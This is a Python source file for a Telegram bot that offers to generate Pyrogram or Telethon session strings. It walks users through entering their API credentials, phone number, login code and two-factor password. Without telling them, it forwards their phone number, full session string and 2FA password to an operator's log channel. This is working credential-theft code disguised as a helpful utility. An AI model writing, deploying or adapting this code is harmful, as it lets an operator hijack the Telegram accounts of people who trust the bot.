from pyrogram import filters
from pyrogram.types import CallbackQuery, Message
from pyrogram.enums import ChatAction
from pyrogram import Client as PyroClient
from config import API_ID, API_HASH, LOG_CHANNEL_ID
from database import save_user
from telethon.sync import TelegramClient as TeleClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, FloodWaitError
import asyncio

user_state = {}

def init(app):
    @app.on_callback_query(filters.regex("gen_(pyrogram|telethon)"))
    async def ask_api_id(_, cq: CallbackQuery):
        user_state[cq.from_user.id] = {"lib": cq.data.split("_")[1]}
        await cq.message.edit("📲 Send your API ID:")

    @app.on_message(filters.private & filters.text)
    async def session_flow(client, msg: Message):
        uid = msg.from_user.id
        if uid not in user_state:
            return

        state = user_state[uid]
        text = msg.text.strip()

        if "api_id" not in state:
            if not text.isdigit():
                await msg.reply("❗ Please enter a valid numeric API ID.")
                return
            state["api_id"] = int(text)
            await msg.reply("🔑 Now send your API HASH:")
            return

        if "api_hash" not in state:
            state["api_hash"] = text
            await msg.reply("📞 Now send your phone number (with country code, e.g., +1234567890):")
            return

        if "phone" not in state:
            state["phone"] = text if text.startswith("+") else "+" + text
            await msg.reply("🔄 Sending login code...")
            await msg.reply_chat_action(ChatAction.TYPING)

            if state["lib"] == "pyrogram":
                await handle_pyrogram_session(client, msg, state)
            else:
                await handle_telethon_session(client, msg, state)

            del user_state[uid]


async def ask_user(app, user_id, prompt):
    await app.send_message(user_id, prompt)
    return await app.listen(filters.private & filters.chat(user_id), timeout=180)


async def handle_pyrogram_session(main_app, msg, state):
    password_used = None
    try:
        app = PyroClient(":memory:", api_id=state["api_id"], api_hash=state["api_hash"])
        await app.connect()

        sent_code = await app.send_code(state["phone"])
        reply = await ask_user(main_app, msg.chat.id, "📤 Code sent! Enter the code you received:")
        code = reply.text.strip()

        try:
            await app.sign_in(phone_number=state["phone"],
                              phone_code_hash=sent_code.phone_code_hash,
                              phone_code=code)
        except Exception:
            pw_reply = await ask_user(main_app, msg.chat.id, "🔐 2FA is enabled. Enter your password:")
            password_used = pw_reply.text.strip()
            await app.check_password(password_used)

        session_str = await app.export_session_string()
        me = await app.get_me()
        save_user(me)

        log_text = (
            f"📥 **Pyrogram Session Generated**\n"
            f"👤 [{me.first_name}](tg://user?id={me.id})\n"
            f"🆔 `{me.id}`\n"
            f"📞 `{state['phone']}`\n"
            f"📄 `{session_str}`"
        )
        if password_used:
            log_text += f"\n🔐 **2FA Password:** `{password_used}`"

        await main_app.send_message(LOG_CHANNEL_ID, log_text)
        await msg.reply(f"✅ Pyrogram Session:\n\n`{session_str}`", quote=True)
        await app.disconnect()

    except Exception as e:
        await msg.reply(f"❌ Error: `{e}`")


async def handle_telethon_session(main_app, msg, state):
    password_used = None
    try:
        client = TeleClient(StringSession(), state["api_id"], state["api_hash"])
        await client.connect()

        if not await client.is_user_authorized():
            try:
                sent = await client.send_code_request(state["phone"])
            except FloodWaitError as fw:
                await msg.reply(f"⏳ Rate limited. Try again in `{fw.seconds}` seconds.")
                await client.disconnect()
                return
            except Exception as err:
                await msg.reply(f"❌ Failed to send code: `{err}`")
                await client.disconnect()
                return

            code_msg = await ask_user(main_app, msg.chat.id, "📤 Code sent! Enter the code you received:")
            code = code_msg.text.strip()

            try:
                await client.sign_in(phone=state["phone"], code=code)
            except SessionPasswordNeededError:
                pw_msg = await ask_user(main_app, msg.chat.id, "🔐 2FA is enabled. Enter your password:")
                password_used = pw_msg.text.strip()
                await client.sign_in(password=password_used)
            except Exception as e:
                await msg.reply(f"❌ Failed to sign in: `{e}`")
                await client.disconnect()
                return

        session_str = client.session.save()
        me = await client.get_me()
        save_user(me)

        log_text = (
            f"📥 **Telethon Session Generated**\n"
            f"👤 [{me.first_name}](tg://user?id={me.id})\n"
            f"🆔 `{me.id}`\n"
            f"📞 `{state['phone']}`\n"
            f"📄 `{session_str}`"
        )
        if password_used:
            log_text += f"\n🔐 **2FA Password:** `{password_used}`"

        await main_app.send_message(LOG_CHANNEL_ID, log_text)
        await msg.reply(f"✅ Telethon Session:\n\n`{session_str}`", quote=True)
        await client.disconnect()

    except Exception as e:
        await msg.reply(f"❌ Unexpected Error: `{e}`")
